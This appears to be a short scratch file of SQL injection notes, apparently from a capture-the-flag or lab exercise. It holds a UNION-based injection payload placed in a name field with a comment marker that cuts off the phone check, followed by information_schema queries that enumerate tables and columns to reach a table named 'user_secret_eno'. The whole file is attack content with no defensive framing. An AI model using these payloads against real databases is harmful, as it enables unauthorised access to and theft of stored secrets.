Select *
from provider 
where name = '' union select 1 --' or phone = '{phone}'

select table_name from information_schema.tables
-- user_secret_eno

select column_name from information_schema.columns
where table_name = 'user_secret_eno'